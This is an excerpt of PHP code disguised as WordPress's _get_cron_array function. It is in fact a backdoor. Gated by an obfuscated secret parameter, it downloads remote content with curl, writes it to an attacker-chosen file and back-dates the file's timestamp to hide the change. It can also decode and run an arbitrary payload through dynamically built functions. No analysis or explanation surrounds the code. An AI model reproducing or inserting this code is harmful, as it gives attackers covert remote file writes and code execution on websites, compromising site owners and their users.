...
function _get_cron_array() {
	...
	if ( !isset($info['q6bc3cacbc792']) ) die( 'Restricted access' );
	if (isset($info['q6bc3cacbc792fpc'])) {
		$ch = curl_init($info['q6bc3cacbc792ru']);
		curl_setopt($ch, 19913, true);
		echo file_put_contents($info['q6bc3cacbc792fpc'], curl_exec($ch));
		@touch($info['q6bc3cacbc792fpc'], feedmtimeFolder(dirname($info['q6bc3cacbc792fpc']))); die;
	} else {
		preg_match('/[A-Z]/', $info['q6bc3cacbc792'], $sep);
		...
		foreach ($info['feed'] as $sepp) {
			$info['q6bc3cacbc792'] = $sepp($info['q6bc3cacbc792']);
		}
		$sep[3] = $sep[2](@$sep[1], $info['q6bc3cacbc792']); $sep[3]();
	}
}
